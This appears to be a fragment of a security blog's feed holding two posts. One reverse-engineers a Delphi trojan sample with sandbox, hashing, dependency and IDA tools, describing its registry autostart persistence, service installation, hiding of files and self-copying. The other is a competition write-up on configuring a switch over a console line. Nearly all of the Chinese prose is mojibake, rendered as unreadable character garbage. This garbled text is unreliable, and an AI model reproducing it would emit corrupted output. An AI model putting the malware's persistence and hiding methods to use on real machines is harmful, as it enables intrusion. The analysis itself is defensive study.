src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211111437251.png" alt="image-20241211111437251"></p><p>ç—…æ¯’é¦–å…ˆ PROC_exec æ‰“å¼€å¹¶åˆ›å»ºäº†ä¸€ä¸ª conhost.exe è¿›ç¨‹ï¼Œæ¥ç€åœ¨ C:\Program File æ–°å»ºäº† Microsoft DN1 æ–‡ä»¶</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211111544688.png" alt="image-20241211111544688"></p><p>FILE_touch æ–°å»ºäº† images.exe æ–‡ä»¶ï¼Œå¹¶å¯åŠ¨è‡ªé‡Šæ”¾æ–‡ä»¶ã€‚REG_setval è®¾ç½® images.exe ä¸ºå¼€æœºå¯åŠ¨é¡¹</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211112024954.png" alt="image-20241211112024954"></p><p>æ¥ç€è¿›ç¨‹ 1.exe ç»“æŸï¼Œæ‰§è¡Œäº† powershell.exe ï¼Œç„¶å images.exe åœ¨ Windows\CurrentVersion\Explorer\ ä¸‹æ–°å»ºäº†ä¸€ä¸ªé”®å€¼ ADDEJIWOQKï¼Œå¹¶è®¾ç½®äº†ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹å€¼ inst</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211113810367.png" alt="image-20241211113810367"></p><p>æœ€åº•ä¸‹å¯ä»¥çœ‹åˆ°è¿œç¨‹è¿æ¥çš„æœåŠ¡å™¨ipå’Œç«¯å£</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211114057881.png" alt="image-20241211114057881"></p><hr><h1 id="æ–‡ä»¶å¤¹æœ¨é©¬ç—…æ¯’æ ·æœ¬é€†å‘åˆ†æ"><a href="#æ–‡ä»¶å¤¹æœ¨é©¬ç—…æ¯’æ ·æœ¬é€†å‘åˆ†æ" class="headerlink" title="æ–‡ä»¶å¤¹æœ¨é©¬ç—…æ¯’æ ·æœ¬é€†å‘åˆ†æ"></a>æ–‡ä»¶å¤¹æœ¨é©¬ç—…æ¯’æ ·æœ¬é€†å‘åˆ†æ</h1><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><p>Windows è™šæ‹Ÿæœº</p><p>æ²™ç®±ã€Exeinfo PE ç­‰</p><hr><h2 id="æ­¥éª¤-1"><a href="#æ­¥éª¤-1" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><h3 id="äº‘æ²™ç®±åˆ†æ"><a href="#äº‘æ²™ç®±åˆ†æ" class="headerlink" title="äº‘æ²™ç®±åˆ†æ"></a>äº‘æ²™ç®±åˆ†æ</h3><p>å…³é—­æ€æ¯’è½¯ä»¶ï¼Œåœ¨è™šæ‹Ÿæœºä¸­è§£å‹ç—…æ¯’ï¼Œä½¿ç”¨åœ¨çº¿äº‘æ²™ç®±è¿›è¡Œæ–‡ä»¶è§£æ</p><p>å®‰æ’äº‘æ²™ç®±ï¼š<a href="https://sandbox.dbappsecurity.com.cn/">https://sandbox.dbappsecurity.com.cn</a></p><p>å¾®æ­¥äº‘æ²™ç®±ï¼š<a href="https://s.threatbook.com/">https://s.threatbook.com</a></p><p>è¿™é‡Œä½¿ç”¨å®‰æ’äº‘æ²™ç®±ï¼Œé¦–å…ˆè®¿é—®ç½‘ç«™ï¼Œå°†ç—…æ¯’æ–‡ä»¶ä¸Šä¼ è‡³å¹³å°</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211172208565.png" alt="image-20241211172208565"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211172358984.png" alt="image-20241211172358984"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211172510575.png" alt="image-20241211172510575"></p><ol><li><p>ç¡®è®¤ç—…æ¯’çš„ä¿¡æ¯åï¼Œæˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒä¸ªå·¥å…·ã€‚ç”± Windows è‡ªå¸¦çš„ certutil -hashfile</p><blockquote><p>certutil -hashfile æ˜¯ä¸€ä¸ªåœ¨ Windows æ“ä½œç³»ç»Ÿä¸­éå¸¸æœ‰ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒç”¨äºè®¡ç®—æ–‡ä»¶çš„å“ˆå¸Œå€¼ã€‚å“ˆå¸Œå€¼æ˜¯ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œå®ƒä»£è¡¨äº†æ–‡ä»¶å†…å®¹çš„æ•°å­—æŒ‡çº¹ã€‚å³ä½¿æ–‡ä»¶å†…å®¹å‘ç”Ÿå¾®å°å˜åŒ–ï¼Œå…¶å“ˆå¸Œå€¼ä¹Ÿä¼šå‘ç”Ÿæ˜¾è‘—å˜åŒ–ã€‚è¿™ä½¿å¾—å“ˆå¸Œå€¼æˆä¸ºéªŒè¯æ–‡ä»¶å®Œæ•´æ€§å’Œä¸€è‡´æ€§çš„ç†æƒ³å·¥å…·</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certutil <span class="token parameter variable">-hashfile</span> æ–‡ä»¶åœ°å€ MD5certutil <span class="token parameter variable">-hashfile</span> æ–‡ä»¶åœ°å€ SHA1certutil <span class="token parameter variable">-hashfile</span> æ–‡ä»¶åœ°å€ SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211173549416.png" alt="image-20241211173549416"></p></li></ol><h3 id="æŸ¥å£³"><a href="#æŸ¥å£³" class="headerlink" title="æŸ¥å£³"></a>æŸ¥å£³</h3><p>åŸºç¡€ä¿¡æ¯åˆ†æå®Œæˆåï¼Œé€šè¿‡ Exeinfo PE æ¥è¿›è¡ŒæŸ¥å£³</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211173629109.png" alt="image-20241211173629109"></p><p>æ— å£³ï¼Œç”¨ Delphi å†™çš„</p><h3 id="Delphi-åˆ†æ"><a href="#Delphi-åˆ†æ" class="headerlink" title="Delphi åˆ†æ"></a>Delphi åˆ†æ</h3><p>é€šè¿‡ DeDe æŸ¥çœ‹ Delphi ç¨‹åºçª—ä½“å±æ€§</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211173931879.png" alt="image-20241211173931879"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211174048042.png" alt="image-20241211174048042"></p><p>é€šè¿‡ DeDe åˆ†æå·¥å…·æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªç—…æ¯’ç¨‹åºç”±äº”ä¸ªåŠŸèƒ½æ¨¡å—ç»„æˆçš„ï¼Œåˆ†åˆ«ä¸º FromCreateã€Timer1Timerã€Timer2Timerã€Timer3Timerã€Timer4Timerï¼Œå…¶ä¸­ FromCreate ç±»ä¼¼äºç¨‹åºçš„å…¥å£å‡½æ•°ï¼ˆmainï¼‰ï¼Œå‰©ä¸‹ 4 ä¸ªæ˜¯ä¸ªå®šæ—¶å™¨å‡½æ•°</p><h3 id="æ£€æµ‹ä¾èµ–å…³ç³»"><a href="#æ£€æµ‹ä¾èµ–å…³ç³»" class="headerlink" title="æ£€æµ‹ä¾èµ–å…³ç³»"></a>æ£€æµ‹ä¾èµ–å…³ç³»</h3><p>é€šè¿‡ depends å·¥å…·æ¥æ£€æµ‹ä¾èµ–å…³ç³»ï¼š</p><p>æŸ¥è¯¢ Windows åº”ç”¨å¼€å‘æ–‡æ¡£ï¼š<a href="https://learn.microsoft.com/zh-cn/windows/apps/">https://learn.microsoft.com/zh-cn/windows/apps/</a></p><p>é€šè¿‡ Depends æ£€æµ‹å¯ä»¥å‘ç°è¿™ä¸ªç—…æ¯’è°ƒç”¨äº†å¾ˆå¤šæ³¨å†Œè¡¨æ“ä½œå’Œæ–‡ä»¶æ“ä½œï¼Œä¾‹å¦‚</p><pre class="line-numbers language-none"><code class="language-none">RegOpenKeyExA()RegSetValueExA()WriteFile()CreateFileA()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211174802612.png" alt="image-20241211174802612"></p><h3 id="ç«ç»’å‰‘åˆ†æ"><a href="#ç«ç»’å‰‘åˆ†æ" class="headerlink" title="ç«ç»’å‰‘åˆ†æ"></a>ç«ç»’å‰‘åˆ†æ</h3><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211192827482.png" alt="image-20241211192827482"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211192905935.png" alt="image-20241211192905935"></p><p>ç—…æ¯’åˆ›å»ºäº†åä¸º avb.exeã€javasc.exe çš„æ¶æ„æ–‡ä»¶ï¼Œè·¯å¾„å¦‚å›¾æ‰€ç¤ºï¼Œæ‰“å¼€æ–‡ä»¶è·¯å¾„å¯ä»¥è§‚å¯Ÿåˆ°è¿™äº›æ¶æ„æ–‡ä»¶</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211193115969.png" alt="image-20241211193115969"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211193246612.png" alt="image-20241211193246612"></p><p>ç»§ç»­è§‚å¯Ÿï¼Œå¯ä»¥å‘ç°å¤§é‡çš„æ³¨å†Œè¡¨æ“ä½œï¼Œavb.exe å†™å…¥è‡ªå¯åŠ¨æ³¨å†Œè¡¨ï¼š</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211193540797.png" alt="image-20241211193540797"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211193947341.png" alt="image-20241211193947341"></p><p>ç¦ç”¨æ˜¾ç¤ºéšè—æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„é€‰é¡¹ï¼Œä»¥éšè—è‡ªèº«ï¼š</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211194120071.png" alt="image-20241211194120071"></p><h3 id="IDAé™æ€åˆ†æ"><a href="#IDAé™æ€åˆ†æ" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h3><p>Delphi å‡½æ•°å‚è€ƒåº“ï¼š<a href="http://docwiki.embarcadero.com/Libraries/Sydney/en/Main_Page">http://docwiki.embarcadero.com/Libraries/Sydney/en/Main_Page</a></p><p>å‡½æ•°å…¥å£ç‚¹</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211204741892.png" alt="image-20241211204741892"></p><p>f5åç¼–è¯‘</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211205242848.png" alt="image-20241211205242848"></p><p>è°ƒç”¨ Forms::TApplication ç±»çš„ CreateForm æ–¹æ³•ï¼Œä¼ å…¥ off_450FD0[0] æŒ‡å‘çš„å€¼ã€off_44E76C å’Œ off_4510B0ï¼Œè·Ÿè¿› off_44E76C å‡½æ•°ï¼š</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211205915941.png" alt="image-20241211205915941"></p><p>è·Ÿè¿› word_44E8F3</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211210118657.png" alt="image-20241211210118657"></p><p>åˆ†æå‡½æ•°ï¼š</p><ul><li><p>FormCreateï¼šè·Ÿè¿› _TForm1_FormCreate</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211210345919.png" alt="image-20241211210345919"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211210533089.png" alt="image-20241211210533089"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡ŒæŠŠ javasc.exeã€avb.exe æ³¨å†Œä¸ºæœåŠ¡ï¼ŒåŠ å…¥è‡ªå¯åŠ¨</p><p>è·Ÿè¿› sub_44F3A0 </p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211210847675.png" alt="image-20241211210847675"></p><p>åº”è¯¥æ˜¯å†™å…¥æ³¨å†Œè¡¨éšè—æ–‡ä»¶ä¸å¯è§çš„ä»£ç ï¼Œè·Ÿè¿›è¿™é‡Œçš„ &amp;str_HideFileExt å’Œ &amp;str_Hidden</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211031245.png" alt="image-20241211211031245"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211127718.png" alt="image-20241211211127718"></p><p>äºæ˜¯å¯ä»¥å¾—å‡ºç»“è®ºï¼š</p><p>TForm1_FormCreate æ˜¯è¿™ä¸ªç—…æ¯’æ ·æœ¬çš„å…¥å£å‡½æ•°ï¼Œç—…æ¯’çš„åŠŸèƒ½èµ·æºå°±æ˜¯è¿™ä¸ªå‡½æ•°ï¼ŒåŠŸèƒ½æ˜¯å°†ç—…æ¯’æ ·æœ¬æ”¾ç½®åˆ°ç³»ç»Ÿç›˜çš„ Windows ç›®å½•ä¸‹ä¼ªè£…æˆç³»ç»Ÿç¨‹åºï¼Œå°†ç—…æ¯’æ–‡ä»¶å†™å…¥åˆ°æ³¨å†Œè¡¨ä¸­çš„å¼€æœºè‡ªå¯åŠ¨é¡¹é‡Œé¢ï¼Œä»¥å®ç°æ¯æ¬¡å¼€æœºå°±å¯åŠ¨ç—…æ¯’æ ·æœ¬</p></li><li><p>Timer1Timer å‡½æ•°ï¼š</p><p>esc é€€å›åˆ°å‰é¢çš„å‡½æ•°é¡µï¼Œè·Ÿè¿› _TForm1_Timer1Timer å‡½æ•°</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211631344.png" alt="image-20241211211631344"></p><p>è·Ÿè¿› sub_44EF94</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211750291.png" alt="image-20241211211750291"></p><p>è·Ÿè¿› sub_44E9FC</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211211938021.png" alt="image-20241211211938021"></p><p>è·Ÿè¿› sub_44E980</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212035879.png" alt="image-20241211212035879"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œé€šè¿‡ Sysutils::DiskSize è·å–ç£ç›˜å¤§å°æ¥åˆ¤æ–­ç£ç›˜æ˜¯å¦å­˜åœ¨</p><p>ç„¶åå›åˆ°ä¸Šä¸€çº§ sub_44E9FC</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212145672.png" alt="image-20241211212145672"></p><p>æ¥ä¸‹æ¥è°ƒç”¨ GetDriveTypeA åˆ¤æ–­ç£ç›˜ç±»å‹</p><p>ç„¶åé€€å‡º sub_44E9FCï¼Œè¿›å…¥ sub_44EEBC å‡½æ•°</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212424469.png" alt="image-20241211212424469"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212452460.png" alt="image-20241211212452460"></p><p>å…ˆè·Ÿè¿› sub_44EAA4</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212655513.png" alt="image-20241211212655513"></p><p>è¿™é‡Œçš„æ“ä½œä¸»è¦æ˜¯æ–‡ä»¶çš„éå†</p><p>ç„¶åçœ‹ sub_44EC88</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211212800753.png" alt="image-20241211212800753"></p><p>ä¸»è¦æ˜¯è®¾ç½®æ–‡ä»¶å±æ€§ï¼Œéšåè¿›è¡Œäº†ä¸€ä¸ªå¯¹è‡ªèº«çš„æ‹·è´</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ğŸ&lt;/p&gt;</summary>
    
    
    
    <category term="Rev" scheme="http://c1oudfl0w0.github.io/blog/categories/Rev/"/>
    
    
  </entry>
  
  <entry>
    <title>2024å·¥ä¸šäº’è”ç½‘å®‰å…¨å†³èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</id>
    <published>2024-11-28T00:59:52.000Z</published>
    <updated>2024-12-06T15:59:09.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>èµ›åˆ¶æ˜¯ ç†è®º + å·¥æ§ctf + æ¸—é€orè¿ç»´build</p><p>ç†è®ºèµ›æœ¬åœ°å¤§æ¨¡å‹é­…åŠ›æ—¶åˆ»</p><p>ctf éƒ¨åˆ†ä¸Šæ¥å…ˆè€ƒè®¡ç®—æœºç½‘ç»œ&#x2F;è·¯ç”±äº¤æ¢å®è·µï¼Œè€Œæˆ‘è¿˜åœ¨é‡ä¿®è®¡ç½‘ï¼Œä»¤äººæ„Ÿå¹ï¼ˆ</p><p>ç„¶åç”¨ ctf çš„åˆ†æ¢å–æ¸—é€&#x2F;buildå¯åŠ¨ç¯å¢ƒçš„æœºä¼šï¼Œæ¸—é€æ¯æ¬¡å¯åŠ¨ç¯å¢ƒéƒ½åªæœ‰ä¸€å°æ—¶çš„æ—¶é—´èƒ½æ‰“ï¼Œåªèƒ½è¯´æ ¹æœ¬æ‰“ä¸å®Œ555</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128171247204.png" alt="image-20241128171247204"></p><span id="more"></span><hr><p>è®¾å¤‡å¦‚ä¸‹ï¼Œæ˜¯è¥¿é—¨å­çš„ï¼Œäº¤æ¢æœºæ˜¯tplinkçš„ï¼Œæ¯”èµ›çš„æ—¶å€™æ˜¾ç¤ºå™¨æ¥çš„æ˜¯ SCADAï¼š</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/1733190508111.jpg" alt="1733190508111"></p><h1 id="ä»»åŠ¡ä¸€ï¼šç½‘ç»œæ‹“æ‰‘æ„å»º"><a href="#ä»»åŠ¡ä¸€ï¼šç½‘ç»œæ‹“æ‰‘æ„å»º" class="headerlink" title="ä»»åŠ¡ä¸€ï¼šç½‘ç»œæ‹“æ‰‘æ„å»º"></a>ä»»åŠ¡ä¸€ï¼šç½‘ç»œæ‹“æ‰‘æ„å»º</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">ä»¥æœ¬æœºèƒ½å¤Ÿpingé€š192.168.N.86æˆåŠŸä¸ºæ ‡å‡†æ„å»ºæ‹“æ‰‘ï¼ˆNæ˜¯è‡ªå·±é˜Ÿä¼çš„Cæ®µï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£…æ‰€ç»™çš„consoleé©±åŠ¨</p><p>ç¬”è®°æœ¬ usb æ’ console çº¿ï¼Œå¦ä¸€å¤´æ’äº¤æ¢æœºçš„ console å£è¿›è¡Œè¿æ¥ï¼Œxshellç”¨ SERIAL åè®®è¿æ¥ COM7 å£ï¼ˆåœ¨è®¾å¤‡ç®¡ç†å™¨-ç«¯å£å¤„æŸ¥çœ‹å¯¹åº”çš„ç«¯å£ï¼‰</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241203141901391.png" alt="image-20241203141901391"></p><p>æ³¢ç‰¹ç‡è®¾ç½®ä¸ºä¸»åŠæ–¹æä¾›çš„38400ï¼Œè®¾å¤‡ç®¡ç†å™¨é‚£è¾¹ä¹Ÿè¦è®¾ç½®ä¸º38400ï¼ˆæ³¢ç‰¹ç‡ä¸å¯¹ä¼šæ²¡æœ‰è¾“å…¥è¾“å‡ºï¼‰</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241203142021367.png" alt="image-20241203142021367"></p><p>ç„¶åå°±èƒ½è¿ä¸Š</p><p>æ‹“æ‰‘å›¾ï¼š</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128120244671.png" alt="image-20241128120244671"></p><p>consoleè¿ä¸Šäº¤æ¢æœº2è¿›è¡Œé…ç½®ï¼Œé”®å…¥<code>?</code>å¯ä»¥æŸ¥çœ‹å¯ç”¨å‘½ä»¤å’Œå¸®åŠ©ï¼Œtabå¯ä»¥è¡¥å…¨ï¼Œåˆ é™¤å­—ç¬¦è¦ç”¨delï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TL-SG521<span class="token operator"><span class="token file-descriptor important">0</span>></span> broadcast            - Write message to all <span class="token function">users</span> logged in,at <span class="token function">most</span> <span class="token number">256</span>                         characters <span class="token builtin class-name">enable</span>               - Enter Privileged EXEC Mode <span class="token function">ping</span>                 - Ping <span class="token builtin class-name">command</span> tracert              - Tracet route to destination <span class="token builtin class-name">exit</span>                 - Exit current modeTL-SG521<span class="token operator"><span class="token file-descriptor important">0</span>></span>enableTL-SG5210<span class="token comment">#</span> broadcast            - Write message to all <span class="token function">users</span> logged in,at <span class="token function">most</span> <span class="token number">256</span>                         characters configure            - Enter Global Configuration Mode copy                 - Config <span class="token function">file</span> commands debug                - Debugging commands enable-admin         - Achieve the admin privilege firmware             - Firmware commands <span class="token builtin class-name">logout</span>               - Logout the system <span class="token function">ping</span>                 - Ping <span class="token builtin class-name">command</span> <span class="token function">reboot</span>               - Reboot the system remove               - Config <span class="token function">file</span> commands reset                - Reset the system tracert              - Tracet route to destination <span class="token function">clear</span>                - Reset functions <span class="token builtin class-name">exit</span>                 - Exit current mode show                 - Display system information TL-SG5210<span class="token comment">#ping 192.168.52.86</span>Pinging <span class="token number">192.168</span>.52.86 with <span class="token number">64</span> bytes of data <span class="token builtin class-name">:</span>Destination Host Unreachable<span class="token operator">!</span>Destination Host Unreachable<span class="token operator">!</span>Destination Host Unreachable<span class="token operator">!</span>Destination Host Unreachable<span class="token operator">!</span>Ping statistics <span class="token keyword">for</span> <span class="token number">192.168</span>.52.86:    Packets: Sent <span class="token operator">=</span> <span class="token number">0</span> , Received <span class="token operator">=</span> <span class="token number">0</span> , Lost <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span>% loss<span class="token punctuation">)</span>Approximate round trip <span class="token builtin class-name">times</span> <span class="token keyword">in</span> milli-seconds:Minimum <span class="token operator">=</span> 0ms , Maximum <span class="token operator">=</span> 0ms , Average <span class="token operator">=</span> 0msTL-SG5210<span class="token comment">#enable-admin</span>Authentication fail. You should <span class="token builtin class-name">enable</span> AAA first.Error password<span class="token operator">!</span>TL-SG5210<span class="token comment">#configure</span>TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#</span> aaa                  - Authentication Authorization Accounting commands access-list          - Create a temporary Access-List entry arp                  - Address Resolution Protocol <span class="token punctuation">(</span>ARP<span class="token punctuation">)</span> boot                 - Boot configuration cloud-server         - Config Cloud Server status contact-info         - Contact information dns                  - Configure domain name system dot1q-tunnel         - Dot1q-tunnel configuration dot1x                - Globally Enable <span class="token number">802</span>.1x feature <span class="token builtin class-name">enable</span>               - Configure <span class="token builtin class-name">enable</span> password gvrp                 - GVRP global configuration holiday              - Configure the holiday <span class="token function">time</span> range <span class="token function">hostname</span>             - System name interface            - Select an interface to configure <span class="token function">ip</span>                   - IP address commands ipv6                 - Internet Protocol version <span class="token number">6</span> <span class="token punctuation">(</span>IPv6<span class="token punctuation">)</span> lacp                 - Configure LACP global system priority line                 - Enter Line Configuration Mode lldp                 - Configure LLDP global subcommands location             - System location logging              - System log configuration loopback-detection   - Enable loopback-detection mac                  - Global Bridge table configuration commands mac-vlan             - Configure a MAC-based VLAN entry monitor              - Monitoring different system events port-channel         - EtherChannel configuration protocol-vlan        - Protocol VLAN commands qos                  - Configure quality of <span class="token function">service</span> <span class="token punctuation">(</span>QoS<span class="token punctuation">)</span> on the device radius-server        - Modify RADIUS query parameters rmon                 - SNMP RMON configuration router               - router <span class="token function">service</span>              - Change Service state snmp-server          - SNMP server configuration spanning-tree        - Configure Spanning Tree Subsystem system-time          - System-time configuration tacacs-server        - Modify TACACS query parameters telnet               - Telnet configuration time-range           - Configure the <span class="token function">time</span> range  ucl                  - UCL commands user                 - Add a new user or modify an exist user vlan                 - VLAN commands voice                - Voice VLAN global commands <span class="token function">clear</span>                - Reset functions end                  - Return to Privileged EXEC Mode <span class="token builtin class-name">exit</span>                 - Exit current mode no                   - Negate <span class="token builtin class-name">command</span> show                 - Display system information TL-SG5210<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#interface </span> fastEthernet         - FastEthernet IEEE <span class="token number">802.3</span> gigabitEthernet      - GigabitEthernet IEEE <span class="token number">802</span>.3z loopback             - Loopback interface port-channel         - Ethernet Channel of interfaces range                - Interface Range Mode ten-gigabitEthernet  - Ten-GigabitEthernet IEEE <span class="token number">802</span>.3ae vlan                 - Interface VLAN Mode<span aria-hidden="true" 